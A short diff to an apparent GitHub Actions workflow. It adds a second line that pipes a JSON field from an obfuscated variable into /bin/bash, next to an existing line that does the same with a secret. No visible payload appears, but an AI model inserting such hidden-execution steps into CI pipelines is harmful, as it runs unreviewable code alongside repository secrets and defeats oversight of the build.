@@ -19,6 +19,7 @@ jobs:
           qakoc09: ${{ secrets.qakoc09 }}
         run: |
           printf '%s' "$qakoc09" | jq -r .o9827 | /bin/bash
+          echo $rwyt11 | jq -r .dwg946 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
